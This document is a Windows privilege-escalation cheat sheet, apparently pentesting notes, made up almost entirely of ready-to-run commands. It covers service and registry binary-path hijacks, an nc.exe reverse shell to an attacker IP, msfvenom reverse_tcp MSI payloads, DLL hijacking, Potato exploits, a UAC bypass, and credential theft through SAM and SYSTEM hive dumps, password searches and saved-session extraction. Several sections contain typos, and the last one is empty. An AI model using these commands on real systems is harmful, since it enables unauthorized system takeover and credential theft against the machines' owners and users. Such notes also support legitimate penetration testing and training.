**Tools**

`powershell.exe -ex bypass -c Import-Module .\powerup.ps1; Invoke-AllChecks`

`winPEAS.exe cmd fast`
***
**Weak Service Permissions**
*It is very often in Windows environments to discover services that run with SYSTEM privileges and they don’t have the appropriate permissions set by the administrator. This means that either the user has permissions over the service or over the folder of where the binary of the service is stored or even worse both.*

- Upload *accesschk.exe* to a writable directory first. For XP SP0, version 5.2 of *accesschk.exe* is needed. 
- You can execute the command as follows to list potentially vulnerable services. This will show list each service and the groups which have write permissions to that service. if you have an account in any of these groups then you’ve potentially got privilege escalation.
```cmd
accesschk.exe -uwcqv * /accepteula
```
- You could instead supply a group/user and it will limit output to services that group/user has write permission to. 
```cmd
accesschk.exe -uwcqv "Group Name/User Name" * /accepteula
```
- The output will be the service name, the group name and the permissions that group has. Anything like *SERVICE_CHANGE_CONFIG* or *SERVICE_ALL_ACCESS* is a win.
- The next step is to determine the status of this service and the binary path name. 
```cmd
sc qc "Service Name"
```
- Case-a) Add the user to the admin group.
```cmd
sc config "Service Name" binPath="net localgroup administrators <username> /add"
```
- Case-b) Upload nc.exe to writable directory and change the config of service
```cmd
sc config "Service Name" binpath= "C:\Inetpub\nc.exe -nv <attackerip> <attacker port> -e C:\WINDOWS\System32\cmd.exe"
sc config "Service Name" obj= ".\LocalSystem" password= ""
```
- Restart Service
```cmd
sc stop "Service Name"
sc start "Service Name"
```
***
**Executable file**
Here we are looking for executable files associace with a service that we can overwrite.
- Find the files where we have write permission
```cmd
accesschk.exe -wusv "user" "C:\Program Files" | findstr /E /C:".exe"
```
- Find out the service name
```cmd
wmic service name,pathname | findstr <name_service.exe>
```
- Generate a malicios exe file and dopr it in the target directory
***
**Schedule Task**
*Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.* 
- List all the tasks
```cmd
schtasks /query /fo LIST /v
```
- Copy-paste the text and past it into file on Kali *schtask.txt*
- Search the task with privilege. You can change the name SYSTEM to another privileged user.
```cmd
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```
- Launching a Scheduled Task manually using *schtasks*. 
```cmd
schtasks /RUN /TN "Task Name"
```
***
**Insecure Service Registry Permissions**
- Find writable registry keys for services using Accesschk.
```cmd
accesschk.exe "hostname\username" -kwsuwq hklm\system\currentcontrolset\services
accesschk.exe "NT AUTHORITY\INTERACTIVE" -kwsuwq hklm\system\currentcontrolset\services
```
- Check query value.
```cmd
reg query HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath
```
- Change image path.
```cmd
reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d "C:\temp\evil.exe"
```
- Restart the service and the custom payload will be executed instead of the service binary and it will return back a shell as SYSTEM.
```cmd
sc start "SomeSoftwareName"
```
***
**DLL Hijacking**
In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly. If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.
- Find missing DLL
```cmd
powershell.exe -ep bypass -c Import-Module .\powerup.ps1; Find-PathDLLHijack
```
- Check if you have frite permission in the directory
```cmd
icacls <path dll>
```
- Compile a malicios dll with msfvenom and move it into the vulnerable directory.
- Restart the process
***
**AlwaysInstallElevated**
*AlwaysInstallElevated is functionality that offers all users (especially the low privileged user) on a windows machine to run any MSI file with elevated privileges.*
 - Check if these 2 registry value is 1.
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- If yes, create malicious file.
```cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi-nouac -o evil.msi

msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f msi-nouac -o setup.msi
```
- Execute your file on victim.
```cmd
msiexec /quiet /qn /i C:\evil.msi
```
***
**Unquoted paths**
*If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges*
- For example, the following path would be vulnerable:
```cmd
C:\Program Files\canon\IJ Scan Utility\SETEVENT.exe
```
- We could place our payload with any of the following paths:*
```cmd
C:\Program.exe
C:\Program Files\canon\IJ.exe
```
- The following command will display affected services:
```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```
***
**Hot Potato**
*NBNS spoofing + NTLM relay + implementation of a fake WPAD proxy server which is running locally on the target host*
- Command to add user to admin group:
```cmd
powershell.exe -ep bypass -c Import-Module ./Tater.ps1; Invoke-Tater -Trigger 1 -Command "net localgroup administrators <user name> /add"
```
***
**Jucy Potato**
*When you have SeImpersonate or SeAssignPrimaryToken privileges*
```cmd
juicypotato.exe -l 1337 -p c:\user\tmp\shell.exe -t * 
```
***
```cmd
tanter.exe <user name>
```
***
**UAC Bypass**
```cmd
akagi32 <Key> <executable file>
```
```cmd
akagi32 10 c:\windows\system32\reverse_shell.exe
```
***
**Saved session information (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)**
```cmd
powershell.exe -ep bypass -c Import-Module SessionGopher.ps1; Invoke-SessionGopher -Thorough
```
```cmd
SessionGopher.exe
```
***
**Exploit user privileges**

***
**ClearText passwords**
- Find all passwords in all files
```cmd
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /spin "password" *.*
```
- Credentials in cmdkey
```cmd
cmdkey /list
```
- Find passwords in event log files. 
```cmd
C:\Windows\System32\Config\*.evt
```
```cmd
C:\Windows\System32\winevt\Logs\*.evtx
```
```
Get-WinEvent -path file.evtx
```
- SAM and SYTEM file
```cmd
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system

C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\SAM
C:\Windows\repair\system
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\RegBack\system
```
- These are common files to find them in. They might be base64-encoded. So look out for that
```cmd
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
```
- In Registry
```cmd
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

```
***
**Escalate to SYSTEM from Administrator**
